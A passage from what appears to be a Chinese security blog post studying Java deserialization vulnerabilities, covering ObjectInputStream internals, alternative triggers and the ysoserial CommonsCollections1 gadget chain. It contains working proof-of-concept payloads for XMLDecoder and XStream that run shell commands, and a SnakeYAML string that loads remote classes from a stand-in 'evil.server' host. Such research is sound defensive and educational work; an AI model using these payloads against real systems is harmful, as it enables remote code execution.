java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializeDemo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String [] args)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      Employee e = <span class="keyword">new</span> Employee();</span><br><span class="line">      e.name = <span class="string">"Reyan Ali"</span>;</span><br><span class="line">      e.address = <span class="string">"Phokka Kuan, Ambehta Peer"</span>;</span><br><span class="line">      e.SSN = <span class="number">11122333</span>;</span><br><span class="line">      e.number = <span class="number">101</span>;</span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">         FileOutputStream fileOut =</span><br><span class="line">         <span class="keyword">new</span> FileOutputStream(<span class="string">"/tmp/employee.ser"</span>);</span><br><span class="line">         ObjectOutputStream out = <span class="keyword">new</span> ObjectOutputStream(fileOut);</span><br><span class="line">         out.writeObject(e);</span><br><span class="line">         out.close();</span><br><span class="line">         fileOut.close();</span><br><span class="line">         System.out.printf(<span class="string">"Serialized data is saved in /tmp/employee.ser"</span>);</span><br><span class="line">      &#125;<span class="keyword">catch</span>(IOException i)</span><br><span class="line">      &#123;</span><br><span class="line">          i.printStackTrace();</span><br><span class="line">      &#125;</span><br><span class="line">   &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行后，生成employee.ser</p><p><img src="/images/study_java_deseriablized/image-20190923193109921.png" alt="image-20190923193109921"></p><p>根据<a href="https://docs.oracle.com/javase/8/docs/platform/serialization/spec/protocol.html" target="_blank" rel="noopener">序列化规范</a>，<code>aced</code>代表java序列化数据的magic word<code>STREAM_MAGIC</code>,<code>0005</code>表示版本号<code>STREAM_VERSION</code>,<code>73</code>表示是一个对象<code>TC_OBJECT</code>,<code>72</code>表示这个对象的描述<code>TC_CLASSDESC</code></p><p>所以在日常测试中，如果解开类似Base64后，起始为aced打头，可以尝试使用反序列化的payload。</p><p>在对其做完序列化操作后，我们在另一个JVM中恢复该对象，需要用到<code>ObjectInputStream</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">DeserializeDemo</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String [] args)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">      Employee e = <span class="keyword">null</span>;</span><br><span class="line">      <span class="keyword">try</span></span><br><span class="line">      &#123;</span><br><span class="line">         FileInputStream fileIn = <span class="keyword">new</span> FileInputStream(<span class="string">"/tmp/employee.ser"</span>);</span><br><span class="line">         ObjectInputStream in = <span class="keyword">new</span> ObjectInputStream(fileIn);</span><br><span class="line">         e = (Employee) in.readObject();</span><br><span class="line">         in.close();</span><br><span class="line">         fileIn.close();</span><br><span class="line">      &#125;<span class="keyword">catch</span>(IOException i)</span><br><span class="line">      &#123;</span><br><span class="line">         i.printStackTrace();</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">      &#125;<span class="keyword">catch</span>(ClassNotFoundException c)</span><br><span class="line">      &#123;</span><br><span class="line">         System.out.println(<span class="string">"Employee class not found"</span>);</span><br><span class="line">         c.printStackTrace();</span><br><span class="line">         <span class="keyword">return</span>;</span><br><span class="line">      &#125;</span><br><span class="line">      System.out.println(<span class="string">"Deserialized Employee..."</span>);</span><br><span class="line">      System.out.println(<span class="string">"Name: "</span> + e.name);</span><br><span class="line">      System.out.println(<span class="string">"Address: "</span> + e.address);</span><br><span class="line">      System.out.println(<span class="string">"SSN: "</span> + e.SSN);</span><br><span class="line">      System.out.println(<span class="string">"Number: "</span> + e.number);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>readObject</code>函数反序列化了上面产生的二进制数据流，生成了原有的对象数据结构。需要注意的是，由于SSN为transient，其无法序列化，所以还原后其值为0。</p><p>如果在待序列化类上实现了readObject函数，反序列化过程中会自动调用该类的readObject函数。</p><p>例如在Employee类中添加函数readObject</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream in)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">  in.defaultReadObject();</span><br><span class="line">  System.out.println(<span class="string">"Employee call readObject Function"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在反序列化过程中将调用该函数</p><p><img src="/images/study_java_deseriablized/image-20191008145635285.png" alt="image-20191008145635285"></p><h2 id="2-反序列化触发点扩展"><a href="#2-反序列化触发点扩展" class="headerlink" title="2. 反序列化触发点扩展"></a>2. 反序列化触发点扩展</h2><p>上面展示了序列化和反序列化的原理，并且反序列化的触发点为<code>ObjectInputStream.readObject</code>。那么问题来了，是否Java反序列化只能由该点触发？答案当然是否定的。</p><p>除了上面的方法外，还有如下几种触发方式：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">ObjectInputStream.readObject<span class="comment">// 流转化为Object</span></span><br><span class="line">ObjectInputStream.readUnshared <span class="comment">// 流转化为Object</span></span><br><span class="line">XMLDecoder.readObject <span class="comment">// 读取xml转化为Object</span></span><br><span class="line">Yaml.load<span class="comment">// yaml字符串转Object</span></span><br><span class="line">XStream.fromXML<span class="comment">// XStream用于Java Object与xml相互转化</span></span><br><span class="line">ObjectMapper.readValue<span class="comment">// jackson中的api</span></span><br><span class="line">JSON.parseObject<span class="comment">// fastjson中的api</span></span><br></pre></td></tr></table></figure><p>Note: 对于readUnshared函数，其与readObject函数的区别暂时还没弄明白，引用网上的解释</p><blockquote><p>readUnshared方法读取对象，不允许后续的readObject和readUnshared调用引用这次调用反序列化得到的对象，而readObject读取的对象可以。</p></blockquote><p>但其反序列化过程中仍然可以触发readObject的调用，有待弄清楚。</p><h2 id="3-扩展触发点试验"><a href="#3-扩展触发点试验" class="headerlink" title="3. 扩展触发点试验"></a>3. 扩展触发点试验</h2><p><code>readUnshared</code>函数的使用方式同<code>readObject</code>类似，这里不再叙述。这一小节主要讲各种触发点的利用方式，不讲具体的原理。原理部分留到后面分析。</p><h3 id="a-XMLDecoder-readObject"><a href="#a-XMLDecoder-readObject" class="headerlink" title="a. XMLDecoder.readObject"></a>a. XMLDecoder.readObject</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span></span>&#123;</span><br><span class="line">  String poc = <span class="string">"poc.xml"</span>;</span><br><span class="line">  <span class="keyword">try</span> &#123;</span><br><span class="line">    FileInputStream file = <span class="keyword">new</span> FileInputStream(poc);</span><br><span class="line">    XMLDecoder decoder = <span class="keyword">new</span> XMLDecoder(file);</span><br><span class="line">    decoder.readObject();</span><br><span class="line">    decoder.close();</span><br><span class="line">  &#125; <span class="keyword">catch</span> (FileNotFoundException e) &#123;</span><br><span class="line">    e.printStackTrace();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>poc.xml</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="UTF-8"?&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">java</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">object</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"3"</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"0"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>/bin/sh<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"1"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">void</span> <span class="attr">index</span>=<span class="string">"2"</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>open /Applications/Calculator.app<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">void</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">array</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">object</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></span><br></pre></td></tr></table></figure><p>最终可触发命令执行</p><h3 id="b-Yaml-load"><a href="#b-Yaml-load" class="headerlink" title="b. Yaml.load"></a>b. Yaml.load</h3><p><a href="https://blog.semmle.com/swagger-yaml-parser-vulnerability/" target="_blank" rel="noopener">参考链接</a>，这里暂未试验</p><p>添加SnakeYAML库</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/org.yaml/snakeyaml --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>org.yaml<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>snakeyaml<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.25<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">  String yamlStr = <span class="string">"!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader "</span></span><br><span class="line">                   + <span class="string">"[[!!java.net.URL [\"http://evil.server\"]]]]"</span>;</span><br><span class="line">  Yaml yaml = <span class="keyword">new</span> Yaml();</span><br><span class="line">  Object obj = yaml.load(yamlStr);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里的yamlStr可以用<a href="https://github.com/mbechler/marshalsec生成危害更大的payload" target="_blank" rel="noopener">https://github.com/mbechler/marshalsec生成危害更大的payload</a></p><h3 id="c-XStream-fromXML"><a href="#c-XStream-fromXML" class="headerlink" title="c. XStream.fromXML"></a>c. XStream.fromXML</h3><p><a href="http://www.polaris-lab.com/index.php/archives/658/" target="_blank" rel="noopener">参考链接</a></p><p>添加XStream库</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>com.thoughtworks.xstream<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>xstream<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>1.4.10<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line"><span class="comment">//        expGen();</span></span><br><span class="line">        String payload = <span class="string">"&lt;sorted-set&gt;\n"</span> +</span><br><span class="line">                <span class="string">"    &lt;string&gt;foo&lt;/string&gt;\n"</span> +</span><br><span class="line">                <span class="string">"    &lt;dynamic-proxy&gt;\n"</span> +</span><br><span class="line">                <span class="string">"    &lt;interface&gt;java.lang.Comparable&lt;/interface&gt;\n"</span> +</span><br><span class="line">                <span class="string">"        &lt;handler class=\"java.beans.EventHandler\"&gt;\n"</span> +</span><br><span class="line">                <span class="string">"            &lt;target class=\"java.lang.ProcessBuilder\"&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                &lt;command&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                    &lt;string&gt;/bin/sh&lt;/string&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                    &lt;string&gt;-c&lt;/string&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                    &lt;string&gt;open /System/Applications/Calculator.app&lt;/string&gt;\n"</span> +</span><br><span class="line">                <span class="string">"                &lt;/command&gt;\n"</span> +</span><br><span class="line">                <span class="string">"            &lt;/target&gt;\n"</span> +</span><br><span class="line">                <span class="string">"     &lt;action&gt;start&lt;/action&gt;"</span>+</span><br><span class="line">                <span class="string">"        &lt;/handler&gt;\n"</span> +</span><br><span class="line">                <span class="string">"    &lt;/dynamic-proxy&gt;\n"</span> +</span><br><span class="line">                <span class="string">"&lt;/sorted-set&gt;\n"</span>;</span><br><span class="line">        XStream xStream = <span class="keyword">new</span> XStream();</span><br><span class="line">        xStream.fromXML(payload);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><h3 id="d-上面的6和7，留到后面分析"><a href="#d-上面的6和7，留到后面分析" class="headerlink" title="d. 上面的6和7，留到后面分析"></a>d. 上面的6和7，留到后面分析</h3><h2 id="4-小结"><a href="#4-小结" class="headerlink" title="4. 小结"></a>4. 小结</h2><p>上面两节介绍了Java反序列化的原理，并扩展了反序列化的触发点。在实际的审计过程中，可以直接关注这些函数的调用</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(readObject|readUnshared|load|fromXML|readValue|parseObject)\s*\(</span><br></pre></td></tr></table></figure><p>当然有些还需要看是否是有漏洞的版本</p><h1 id="0x02-反序列化过程"><a href="#0x02-反序列化过程" class="headerlink" title="0x02 反序列化过程"></a>0x02 反序列化过程</h1><p>上面大致讲诉了序列化和反序列化的使用方法，本节将调试上面的<code>Employee</code>案例，来看看在代码层面反序列化过程是怎么样的！</p><p>这里使用的是<code>ObjectInputStream</code>的反序列化方法<code>readObject</code>函数</p><p>其实整一个反序列化过程总体来说分为两步，从字符串流中根据序列化规格提取出可能的类，然后将该类使用反射机制查找或创建一个实例。其中也会有一些检查的过程，这里例子比较简单，不叙述。</p><p>来看一下查找或创建的过程</p><p><code>ObjectInputStream:readObject:417</code></p><p><img src="/images/study_java_deseriablized/image-20191009165050116.png" alt="image-20191009165050116"></p><p>跟进ObjectInputStream的readObject类，该函数体现了整个反序列化的过程，其中其主要功能的是<code>readObject0</code>函数</p><p><code>ObjectInputStream:readObject0:1515</code></p><p><img src="/images/study_java_deseriablized/image-20191009171309599.png" alt="image-20191009171309599"></p><p>从流中读取出当前的类型，<code>tc=115</code>此时代表Object对象，从而进入<code>readOrdinaryObject</code></p><p><code>ObjectInputStream:readOrdinaryObject:2026</code></p><p><img src="/images/study_java_deseriablized/image-20191009191352950.png" alt="image-20191009191352950"></p><p>该函数主要做了实例化对象的工作，其中2033行生成的ObjectStreamClass对象，会利用反射机制实例化序列化流中的对象。2044行实际的获取到该对象。</p><p>关于ObjectStreamClass的功能，它是类的序列化描述器，包含类的名字和序列版本号。使用它的lookup函数可以载入或新建该类，但这里实际上用的是newInstance来实例化当前的序列化描述器，即产生当前描述器指代的类。</p><blockquote><p>Serialization’s descriptor for classes. It contains the name and serialVersionUID of the class. The ObjectStreamClass for a specific class loaded in this Java VM can be found/created using the lookup method.</p></blockquote><p>其中函数<code>readClassDesc</code>将从序列化流中提取出相关的类信息。这里就直接看利用反射机制获取到类的地方，位于<code>ObjectInputStream.resolveClass</code>，下图为调用链</p><p><img src="/images/study_java_deseriablized/image-20191009193053871.png" alt="image-20191009193053871" style="zoom:50%;"></p><p><code>ObjectInputStream:resolveClass:677</code></p><p><img src="/images/study_java_deseriablized/image-20191009193404315.png" alt="image-20191009193404315"></p><p>这里提取了jvm中当前这个流中的类的Class对象，用于后续的newInstance。</p><p>此处整一个反射就是先通过<code>Class.forName</code>获取到当前描述器所指代的类的Class对象，后续会在<code>initNonProxy</code>或<code>initProxy</code>函数中复制该Class对象的相关信息(包括相关函数)，最后在2044行处<code>ObjectStreamClass.newInstance</code>实例化该对象。</p><p>在实例化后会用<code>ObjectInputStream.readSerialData</code>函数将序列化流中的相关数据填充进实例化后的对象中或调用当前类描述器的readObject函数。</p><p><code>ObjectInputStream:readSerialData:2149</code></p><p><img src="/images/study_java_deseriablized/image-20191011113246544.png" alt="image-20191011113246544"></p><p>这里会根据当前的类描述器是否存在readObject函数来自动调用该函数，或者是填充序列流中的field数据。这里的readObject的调用常为利用链的一部分，例如CommonsCollections1中的<code>AnnotationInvocationHandler</code>，后文将分析该函数。</p><p>注意：由于我们用的是Serializable接口，所以上述并未提及使用Externalizable接口的情况。</p><p>到此为止，最后返回的对象就是最终我们得到的序列化前的对象。</p><h2 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h2><p>这里引用<a href="https://github.com/Cryin/Paper/blob/master/浅谈Java反序列化漏洞修复方案.md" target="_blank" rel="noopener">浅谈Java反序列化漏洞修复方案</a></p><blockquote><p>Java程序中类ObjectInputStream的readObject方法被用来将数据流反序列化为对象，如果流中的对象是class，则它的ObjectStreamClass描述符会被读取，并返回相应的class对象，ObjectStreamClass包含了类的名称及serialVersionUID。</p><p>如果类描述符是动态代理类，则调用resolveProxyClass方法来获取本地类。如果不是动态代理类则调用resolveClass方法来获取本地类。如果无法解析该类，则抛出ClassNotFoundException异常。</p><p>如果反序列化对象不是String、array、enum类型，ObjectStreamClass包含的类会在本地被检索，如果这个本地类没有实现java.io.Serializable或者externalizable接口，则抛出InvalidClassException异常。因为只有实现了Serializable和Externalizable接口的类的对象才能被序列化。</p></blockquote><p>前面分析中提到最后会调用<code>resolveClass</code>获取类的Class对象，这是反序列化过程中一个重要的地方，也是必经之路，所以有研究人员提出通过重载<code>ObjectInputStream</code>的<code>resolveClass</code>来限制可以被反序列化的类</p><h1 id="0x03-利用链发掘"><a href="#0x03-利用链发掘" class="headerlink" title="0x03 利用链发掘"></a>0x03 利用链发掘</h1><p>同PHP的反序列化一样，单单发现反序列化的触发点并不能造成严重的影响。往往反序列化漏洞的危害程度取决于后续的反序列化利用链所能达到的危险程度。在java中<a href="https://github.com/frohoff/ysoserial" target="_blank" rel="noopener">ysoserial</a>工具给我们提供了许多常见的库存在的利用链，这一节将逐一分析这些利用链。</p><h2 id="1-CommonsCollections1-jdk-lt-7"><a href="#1-CommonsCollections1-jdk-lt-7" class="headerlink" title="1. CommonsCollections1(jdk&lt;=7)"></a>1. CommonsCollections1(jdk&lt;=7)</h2><p><a href="https://security.tencent.com/index.php/blog/msg/97" target="_blank" rel="noopener">参考链接</a></p><blockquote><p>Apache Commons Collections是一个扩展了Java标准库里的Collection结构的第三方基础库，它提供了很多强有力的数据结构类型并且实现了各种集合工具类。作为Apache开源项目的重要组件，Commons Collections被广泛应用于各种Java应用的开发。</p></blockquote><p>CommonsCollection1的分析文章比较多，刚开始先从这个gadget开始分析。这里我用的分析方法是先写一个触发点，然后用ysoserial生成payload来调试。</p><p>CommonsCollections1 payload针对的commons-collections 3.1版本，先引入库</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">&lt;!-- https://mvnrepository.com/artifact/commons-collections/commons-collections --&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">dependency</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">groupId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">groupId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">artifactId</span>&gt;</span>commons-collections<span class="tag">&lt;/<span class="name">artifactId</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">version</span>&gt;</span>3.1<span class="tag">&lt;/<span class="name">version</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">dependency</span>&gt;</span></span><br></pre></td></tr></table></figure><p>在ysoserial的exp中，我们可以看到一整个调用的链</p><p><img src="/images/study_java_deseriablized/image-20191011113756573.png" alt="image-20191011113756573"></p><p>我们可以看到利用链的最后调用了<code>Runtime.getRuntime().exec()</code>，这意味着我们需要在前一步的链上可以达到调用任意类和方法的函数。</p><p>CommonsCollections1用的就是3.1版本下的<code>InvokerTransformer.transform()</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object input)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (input == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        Class cls = input.getClass();</span><br><span class="line">        Method method = cls.getMethod(iMethodName, iParamTypes);</span><br><span class="line">        <span class="keyword">return</span> method.invoke(input, iArgs);</span><br><span class="line"></span><br><span class="line">    &#125; <span class="keyword">catch</span> (NoSuchMethodException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' does not exist"</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (IllegalAccessException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' cannot be accessed"</span>);</span><br><span class="line">    &#125; <span class="keyword">catch</span> (InvocationTargetException ex) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> FunctorException(<span class="string">"InvokerTransformer: The method '"</span> + iMethodName + <span class="string">"' on '"</span> + input.getClass() + <span class="string">"' threw an exception"</span>, ex);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>此处用的就是Java的反射机制，动态调用类和方法。为了能动态调用任意类函数，我们还得控制<code>iMethodName、iParamTypes、iArgs</code>，该类属性定义在InvokerTransformer的构造函数上</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">InvokerTransformer</span><span class="params">(String methodName, Class[] paramTypes, Object[] args)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>();</span><br><span class="line">    iMethodName = methodName;</span><br><span class="line">    iParamTypes = paramTypes;</span><br><span class="line">    iArgs = args;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>那么接下来就跟php类似了，找一个类，它的类属性可控，且该类属性后续还会调用transform函数。由于完成<code>Runtime.getRuntime().exec()</code>动作需要多次调用transform函数（先调用Runtime.getRuntime再调用Runtime.exec），所以还得找一个能多次调用transform的地方，来看一下<code>ChainedTransformer</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> <span class="keyword">final</span> Transformer[] iTransformers;<span class="comment">// 填充构造后的实例</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> Object <span class="title">transform</span><span class="params">(Object object)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; iTransformers.length; i++) &#123;</span><br><span class="line">        object = iTransformers[i].transform(object);<span class="comment">// 调用链，</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> object;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在<code>Transformer</code>的子类下面找到能生成命令执行的利用链即可，来分析一下CommonCollections1的构造</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// real chain for after setup</span></span><br><span class="line"><span class="keyword">final</span> Transformer[] transformers = <span class="keyword">new</span> Transformer[] &#123;</span><br><span class="line">      <span class="keyword">new</span> ConstantTransformer(Runtime<span class="class">.<span class="keyword">class</span>),// 获取<span class="title">Runtime</span>对象</span></span><br><span class="line">      new InvokerTransformer("getMethod", new Class[] &#123;//获取Runtime.getRuntime()方法对象</span><br><span class="line">         String.class, Class[].class &#125;, new Object[] &#123;</span><br><span class="line">         <span class="string">"getRuntime"</span>, <span class="keyword">new</span> Class[<span class="number">0</span>] &#125;),</span><br><span class="line">      <span class="keyword">new</span> InvokerTransformer(<span class="string">"invoke"</span>, <span class="keyword">new</span> Class[] &#123;<span class="comment">// 反射调用invoke,再invoke执行Runtime.getRuntime()方法，获取Runtime实例化对象</span></span><br><span class="line">         Object.class, Object[].class &#125;, new Object[] &#123;</span><br><span class="line">         <span class="keyword">null</span>, <span class="keyword">new</span> Object[<span class="number">0</span>] &#125;),</span><br><span class="line">      <span class="keyword">new</span> InvokerTransformer(<span class="string">"exec"</span>,<span class="comment">// 反射调用exec方法，执行最终的命令</span></span><br><span 